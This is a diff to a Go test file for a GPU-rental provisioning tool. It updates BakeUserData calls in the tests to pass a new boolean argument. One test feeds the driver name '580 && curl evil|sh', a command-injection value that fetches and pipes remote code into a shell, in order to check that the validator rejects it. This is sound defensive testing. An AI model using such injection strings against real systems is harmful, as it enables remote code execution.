@@ -87,7 +87,7 @@ func TestHostnameIsGpuAndTheRentalIdsFirstEight(t *testing.T) {
 }
 
 func TestBakeUserData(t *testing.T) {
-	ud, err := BakeUserData("580-server-open", []string{"10de"})
+	ud, err := BakeUserData("580-server-open", []string{"10de"}, false)
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -101,7 +101,7 @@ func TestBakeUserData(t *testing.T) {
 			t.Errorf("ValidDriver(%q) = %v, want %v", d, !ok, ok)
 		}
 	}
-	if _, err := BakeUserData("580 && curl evil|sh", []string{"10de"}); err == nil {
+	if _, err := BakeUserData("580 && curl evil|sh", []string{"10de"}, false); err == nil {
 		t.Errorf("an unsafe driver name was accepted")
 	}
 }
@@ -121,7 +121,7 @@ func TestBakeUserDataPerVendor(t *testing.T) {
 		"other":  {NoDriver, []string{"1ed5"}, []string{"GPUAGENT-BAKE DONE", "cloud-init clean", "rdma-core"}, []string{"nvidia", "linux-firmware"}},
 		"no gpu": {NoDriver, nil, []string{"GPUAGENT-BAKE DONE", "rdma-core"}, []string{"nvidia", "linux-firmware"}},
 	} {
-		ud, err := BakeUserData(c.driver, c.vendors)
+		ud, err := BakeUserData(c.driver, c.vendors, false)
 		if err != nil {
 			t.Fatalf("%s: %v", name, err)
 		}
